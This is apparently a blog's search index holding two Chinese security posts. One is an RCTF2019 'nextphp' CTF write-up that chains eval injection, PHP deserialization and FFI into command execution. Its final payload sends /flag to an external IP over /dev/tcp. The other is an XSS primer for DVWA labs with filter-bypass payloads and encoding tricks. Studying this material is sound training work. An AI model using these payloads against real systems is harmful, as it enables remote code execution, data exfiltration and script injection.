<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[RCTF2019 nextphp writeup]]></title>
    <url>%2F2019%2F07%2F24%2FRCTF2019%20nextphp%20writeup%2F</url>
    <content type="text"><![CDATA[问题PHP is the best language! http://nextphp.2019.rctf.rois.io 解题php代码没有对eval函数中的参数进行任何过滤，猜测存在任意命令执行漏洞 1http://nextphp.2019.rctf.rois.io/?a=echo phpinfo(); 查看php配置信息，发现过滤了大多数系统函数但没有过滤scandir() 1http://nextphp.2019.rctf.rois.io/?a=var_dump(scandir('/var/www/html')); 爆出网站根目录文件 利用file_get_contents()查看preload.php源码 1view-source:http://nextphp.2019.rctf.rois.io/?a=echo%20file_get_contents(%27preload.php%27); preload.php源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfinal class A implements Serializable &#123; protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'print_r', 'arg' =&gt; '1' ]; private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \Exception('No implemented'); &#125; public function __construct () &#123; throw new \Exception('No implemented'); &#125;&#125; PHP7.4新特性：新的自定义对象序列化机制 关于serialize和unserialize 观察代码，发现对象反序列时会执行run()方法 123private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']);&#125; 可以结合__get魔法函数，获取对象data数组中的元素值 123public function __get ($key) &#123; return $this-&gt;data[$key];&#125; 构造自己的序列化对象并调用反序列化方法，include引入preload.php页面，注入代码，查看ret参数 1http://nextphp.2019.rctf.rois.io/?a=include(%27preload.php%27);var_dump(unserialize(%27C:1:%22A%22:150:&#123;a:3:&#123;s:3:%22ret%22;N;s:4:%22func%22;s:7:%22print_r%22;s:3:%22arg%22;a:3:&#123;s:1:%22a%22;s:5:%22apple%22;s:1:%22b%22;s:6:%22banana%22;s:1:%22c%22;a:3:&#123;i:0;s:1:%22x%22;i:1;s:1:%22y%22;i:2;s:1:%22z%22;&#125;&#125;&#125;&#125;%27)-%3E__get(%27ret%27)); 成功执行print_r()函数打印出数组 接下来就是想办法使用系统函数，利用将func修改为system或者exec之类的，但转念一想，能执行系统命令的危险函数不是都被过滤了吗？到这里卡住了。 解决方法ROIS战队Writeup preload.php这个文件名也是hint，google搜索preload site:php.net发现php中的预加载机制配合Writeup中提到了FFI扩展可以实现任意代码执行。对于PHP，FFI开辟了一种在纯PHP中编写PHP扩展和绑定到C库的方法。 php.ini配置使用preload预加载与FFI扩展 12ffi.enable = preload opcache.preload = preload.php 注： 在preload机制中，preload.php中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用，所以在注入代码的时候，并不需要include(‘preload.php’)文件 构造序列化对象 1234567891011121314... protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'FFI::cdef', # 使用C库函数 'arg' =&gt; 'int system(const char *command);' ];... $obj = new A; $ser = serialize($obj); echo $ser; # 输出序列化对象C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;&#125; Payload 1http://nextphp.2019.rctf.rois.io/?a=unserialize('C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;&#125;')-&gt;__get('ret')-&gt;system('bash -c "cat /flag &gt; /dev/tcp/167.99.105.52/8080"'); Get flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS入门总结]]></title>
    <url>%2F2019%2F07%2F24%2Fxss%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a tag may be able to terminate a script block even if it is injected inside a quoted string inside a method call inside the script. This happens because the HTML parser runs before the JavaScript parser. XSS解析器就是浏览器 HTML entities（HTML 实体）HTML中的保留字符（Reserved characters）都会被替换为HTML实体（&lt;&gt;）https://www.w3schools.com/html/html_entities.asp 浏览器如何解码（Freebuf博主）https://www.freebuf.com/articles/web/10121.html XSS漏洞复现http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS &lt; script &gt;标签内的标准弹框语句，不经过数据库存取 alert(1) alert(“xss”) alert(/xss/) alert(‘xss’) 经过数据库存取 alert(1) alert(“xss”) alert(/xss/) alert(\ ‘xss\ ‘)（mysql插入数据时默认用单引号包围，再包括单引号出现语法错误） DOM复现的绕过语句：‘&gt;&lt; img src=# onerror=”alert(‘XSS’)”&gt;&lt;’‘ onclick=alert(/xss/) //‘ onclick=’alert(/xss/)’ # 单引号双引号都没有关系 注：“ &gt;testLink “前面的有个单引号，如果没有明显的引号与前面的属性分开，会与前面的属性结合后再自动添加引号（如果是事件类型），所以可以使用“ 空格// ”分隔，或者直接显示用引号包括事件，如上第二种解决方法。 DVWA安装：https://github.com/ethicalhack3r/DVWA DVWA靶场游玩攻略（XSS）：https://www.freebuf.com/articles/web/123779.htmlhttps://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/ DVWA XSS Reflected• 过滤了“&lt; script &gt;”标签，使用大小写，双写， 添加src属性绕过 • 若采用正则匹配过滤“&lt; script &gt;”，之前方法都行不通，考虑使用其他标签：​ iframe​ input img​ body​ 添加src属性，利用鼠标事件（通用）：​ &lt; IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;​ 利用error事件，适用img​ &lt; IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt; • htmlspecialchars( $_GET[ ‘name’ ] );无解 DVWA XSS Store• mysqli_real_escape_string()转移字符串（SQL中的特殊字符）：一次转义对SQL命令并无太大影响，数据库会存储未转义前的字符 • stripslashes()去除反斜杠 • name字段的限制可以通过burp抓包修改 • addslashes( $ message ),mysqli_real_escape_string（$ message）,htmlspecialchars( $ message )，多次转义，数据库中的特殊符号带上反斜杠，并且$message中的HTML保留字符被转换为HTML实体，impossible级别 DVWA DOM XSS• 基于client的XSS漏洞• the hash symbol(#)不会被服务端接收到（#后面的部分称为fragment） XSS平台搭建 教程：https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1https://blog.csdn.net/u011781521/article/details/53895363 window10配置静态文件https://blog.csdn.net/cz_devil/article/details/16826647https://blog.csdn.net/qq_16241043/article/details/54176442 查看Apache启动失败的错误信息：打开cmd，输入：D:\phpStudy\Apache\binhttpd.exe -t 回车，即显示错误信息 XSS漏洞挖掘识别URL上的输入点可控点：&lt; path&gt;&lt; query&gt;&lt; fragement&gt;• web2.0的URL与传统形式上的差异：更强调明确含义（web2.0url名称与传统URL的映射）• 需要强大的爬虫进行识别• fragment可能出现在服务端解析中 进行XSS测试时，可能的输出点 HTML标签之间 直接输入js代码 闭合标签（其他标签无法执行HTML代码） 注：divprecode这三个标签可以解析HTML代码，不可以解析的标签实际上是进行了htmencode编码 HTML标签之内（属性） 利用事件（效果比较差） 闭合属性，闭合标签（成功率较低） 特殊属性src/href/actionhref执行javascript伪协议，过滤//，考虑js字符串的加减乘除onerror(适用img)data伪协议 成为js代码 闭合script标签 绕过变量引用 HTML与js的自解码与编码函数• HTML标签内（&lt;&gt;&amp;） entity_name：&amp;#xH &amp;#D（可以去除分号） entity_number:&lt; 使用htmlspecialchars（）主动编码 • JS上下文内 unicode格式：\uH（中文要使用） 普通的八进制：\65\65 普通16进制：\xH 反斜杠：&#39;,&quot;,&lt;,&gt; urlncode编码• firefox 和 chorm都会默认url编码 ‘“&lt;&gt;这四种字符，#号后面单引号不会编码，但其他字符还是会进行编码• PHP中$_SERVER[QUERY_STRING]获取urlencode后的内容 URL编码——利用JS统一编码http://www.ruanyifeng.com/blog/2010/02/url_encoding.html 补充：正常unicode格式：\u5487 escape（）编码后：%u5487escapeURI（）编码后：utf-8方式（三个字节）%E7%A2%94（同样百分号开头）escapeURIComponent（）编码后：类似第二种，所有字符编码 注： 编码解码函数参数都可以接收unicode字符， 如果是ASCII范围内，结果返回可打印的字符， 如果超出这个范围，编码正常（可能是unicode模式，可能是utf-8形式），解码都是返回相应的字符 思考： 其次，escape()不对”+”编码。但是我们知道，网页在提交表单的时候，如果有空格，则会被转化为+字符。服 务器处理数据的时候，会把+号处理成空格。所以，使用的时候要小心。 XSS game http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html Hack mehttps://hack.me/ XSStrikehttps://github.com/s0md3v/XSStrike 基于DOM的XSS模糊测试论文（基础打好后再看）https://www.hindawi.com/journals/jcnc/2018/8159548/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>漏洞学习</tag>
      </tags>
  </entry>
</search>
